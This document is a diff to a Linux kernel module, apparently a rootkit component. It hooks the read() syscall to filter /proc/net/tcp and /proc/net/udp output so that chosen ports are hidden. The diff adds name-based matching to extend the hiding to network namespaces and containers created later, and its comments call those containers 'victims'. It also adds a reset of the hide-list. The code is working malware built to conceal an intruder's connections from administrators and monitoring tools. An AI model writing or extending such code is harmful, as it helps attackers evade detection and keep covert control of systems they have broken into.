@@ -177,6 +177,28 @@ static unsigned long get_proc_inode(const char *path) {
     return ino;
 }
 
+/*
+ * Per-netns robustness: /proc/net is remounted per network namespace,
+ * so files created AFTER module load (new netns, containers) have a
+ * different inode than the cached ones.  Match by dentry name as a
+ * fallback so containerized victims are covered too.
+ */
+static int is_proc_net_file(struct file *file) {
+    const unsigned char *name;
+
+    if (!file || !file->f_path.dentry)
+        return 0;
+
+    name = file->f_path.dentry->d_name.name;
+    if (!name)
+        return 0;
+
+    return !strcmp((const char *)name, "tcp")  ||
+           !strcmp((const char *)name, "tcp6") ||
+           !strcmp((const char *)name, "udp")  ||
+           !strcmp((const char *)name, "udp6");
+}
+
 /* ================================================================
  * Hooked read() — intercept reads to procfs net files (tcp/udp)
  * ================================================================ */
@@ -187,6 +209,7 @@ asmlinkage long hooked_read(const struct pt_regs *regs) {
     ssize_t ret;
     char *kbuf = NULL;
     unsigned long ino = 0;
+    int is_net_file = 0;
     struct fd f;
     struct file *file;
 
@@ -201,6 +224,11 @@ asmlinkage long hooked_read(const struct pt_regs *regs) {
 #else
     file = f.file;
 #endif
+    /* Evaluate while the fd reference is still held — after fdput()
+     * the struct file pointer may no longer be safe to dereference. */
+    is_net_file = 0;
+    if (file)
+        is_net_file = is_proc_net_file(file);
     if (file) {
         struct inode *inode = file->f_inode;
         if (inode)
@@ -208,9 +236,11 @@ asmlinkage long hooked_read(const struct pt_regs *regs) {
     }
     fdput(f);
 
-    /* Only filter /proc/net/tcp* and /proc/net/udp* */
+    /* Only filter /proc/net/tcp* and /proc/net/udp* — by cached inode
+     * (fast path) or by dentry name (netns created after load). */
     if (ino != proc_net_tcp_ino && ino != proc_net_tcp6_ino &&
-        ino != proc_net_udp_ino && ino != proc_net_udp6_ino) {
+        ino != proc_net_udp_ino && ino != proc_net_udp6_ino &&
+        !is_net_file) {
         return orig_read(regs);
     }
 
@@ -262,6 +292,14 @@ int net_hide_init(void) {
 }
 
 void net_hide_cleanup(void) {
-    hidden_port_count = 0;
+    net_hide_reset();
     pr_info(VAULT_KERNEL_TAG " network hiding cleaned\n");
+}
+
+/* Wipe the whole hide-list under the lock (IOCTL_RESET_ALL) */
+void net_hide_reset(void) {
+    unsigned long flags;
+    spin_lock_irqsave(&net_hide_lock, flags);
+    hidden_port_count = 0;
+    spin_unlock_irqrestore(&net_hide_lock, flags);
 }
